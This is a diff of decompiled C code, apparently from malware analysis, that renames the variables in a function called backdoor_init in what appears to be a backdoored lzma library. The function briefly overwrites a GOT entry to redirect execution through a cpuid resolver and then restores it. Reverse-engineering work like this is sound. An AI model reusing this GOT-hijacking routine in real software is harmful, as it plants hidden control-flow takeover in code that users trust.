@@ -16,28 +16,25 @@
 void * backdoor_init(elf_entry_ctx_t *state,u64 *caller_frame)
 
 {
-  long lVar1;
-  undefined *puVar2;
-  void *pvVar3;
-  long *plVar4;
+  long original_target;
+  undefined *reloc_consts;
+  void *got_base;
   long *got_slot;
-  void *plt_entry;
-  long jump_flags;
   
   (state->got_ctx).got_offset = (ptrdiff_t)state;
   init_elf_entry_ctx(state);
-  puVar2 = PTR__Llzma_block_buffer_decode_0_0010e000;
+  reloc_consts = PTR__Llzma_block_buffer_decode_0_0010e000;
   state->frame_address = (u64 *)(state->got_ctx).return_address;
-  pvVar3 = (void *)((long)state->symbol_ptr - (state->got_ctx).got_offset);
-  (state->got_ctx).got_ptr = pvVar3;
-  plVar4 = (long *)((long)pvVar3 + *(long *)(puVar2 + 8));
-  (state->got_ctx).return_address = plVar4;
-  if (plVar4 != (long *)0x0) {
-    lVar1 = *plVar4;
-    *plVar4 = (long)pvVar3 + *(long *)(puVar2 + 0x10);
-    pvVar3 = (void *)(*(code *)PTR__cpuid_gcc_0010e008)();
-    *plVar4 = lVar1;
+  got_base = (void *)((long)state->symbol_ptr - (state->got_ctx).got_offset);
+  (state->got_ctx).got_ptr = got_base;
+  got_slot = (long *)((long)got_base + *(long *)(reloc_consts + 8));
+  (state->got_ctx).return_address = got_slot;
+  if (got_slot != (long *)0x0) {
+    original_target = *got_slot;
+    *got_slot = (long)got_base + *(long *)(reloc_consts + 0x10);
+    got_base = (void *)(*(code *)PTR__cpuid_gcc_0010e008)();
+    *got_slot = original_target;
   }
-  return pvVar3;
+  return got_base;
 }
 
